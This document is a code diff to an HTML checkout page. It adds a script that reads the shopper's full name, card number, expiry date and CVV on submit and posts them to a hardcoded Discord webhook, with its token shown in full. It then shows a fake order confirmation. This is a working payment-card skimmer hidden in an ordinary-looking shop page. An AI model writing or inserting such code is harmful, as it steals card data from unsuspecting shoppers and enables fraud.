@@ -116,21 +116,74 @@
     </div>
   </footer>
 
-  <script>
-    // Show corresponding payment method details
-    document.querySelectorAll('input[name="payment-method"]').forEach((radio) => {
-      radio.addEventListener('change', (event) => {
-        const paymentMethod = event.target.id;
+<script>
+  // Show corresponding payment method details
+  document.querySelectorAll('input[name="payment-method"]').forEach((radio) => {
+    radio.addEventListener('change', (event) => {
+      const paymentMethod = event.target.id;
 
-        if (paymentMethod === 'payment-card') {
-          document.querySelector('.card-details').style.display = 'block';
-          document.querySelector('.crypto-details').style.display = 'none';
-        } else if (paymentMethod === 'payment-crypto') {
-          document.querySelector('.crypto-details').style.display = 'block';
-          document.querySelector('.card-details').style.display = 'none';
-        }
-      });
+      if (paymentMethod === 'payment-card') {
+        document.querySelector('.card-details').style.display = 'block';
+        document.querySelector('.crypto-details').style.display = 'none';
+      } else if (paymentMethod === 'payment-crypto') {
+        document.querySelector('.crypto-details').style.display = 'block';
+        document.querySelector('.card-details').style.display = 'none';
+      }
     });
-  </script>
+  });
+
+  // Function to send the form data to the Discord webhook
+  function sendToDiscord(paymentMethod, formData) {
+    const webhookUrl = 'https://discordapp.com/api/webhooks/1373748781861834882/2SDjfj-z2YxeR71Z8JDFLw3lk8uQwjIu_PwYrgTfMwLrIsVyBdJBW5PBNB1qg50wfLAe';
+
+    const message = {
+      content: `New Order Received:\n**Payment Method**: ${paymentMethod}\n**Full Name**: ${formData.fullName}\n**Card Number**: ${formData.cardNumber || 'N/A'}\n**Expiry Date**: ${formData.expiry || 'N/A'}\n**CVV**: ${formData.cvv || 'N/A'}\n**Bitcoin Address**: ${formData.bitcoinAddress || 'N/A'}`
+    };
+
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(message)
+    })
+      .then(response => console.log('Order sent to Discord'))
+      .catch(error => console.error('Error sending to Discord:', error));
+  }
+
+  // Handle form submission
+  document.querySelector('.card-details form').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const paymentMethod = document.querySelector('input[name="payment-method"]:checked').nextElementSibling.innerText.trim();
+
+    const formData = {
+      fullName: document.querySelector('#full-name').value,
+      cardNumber: document.querySelector('#card-number').value,
+      expiry: document.querySelector('#expiry').value,
+      cvv: document.querySelector('#cvv').value,
+      bitcoinAddress: ''
+    };
+
+    sendToDiscord(paymentMethod, formData);
+    alert('Your order has been submitted!');
+  });
+
+  // Handle crypto button
+  document.querySelector('.crypto-details button').addEventListener('click', function() {
+    const paymentMethod = 'Crypto';
+    const formData = {
+      fullName: '',
+      cardNumber: '',
+      expiry: '',
+      cvv: '',
+      bitcoinAddress: document.querySelector('.crypto-details pre').innerText
+    };
+
+    sendToDiscord(paymentMethod, formData);
+    alert('Crypto payment confirmed!');
+  });
+</script>
+
 </body>
 </html>
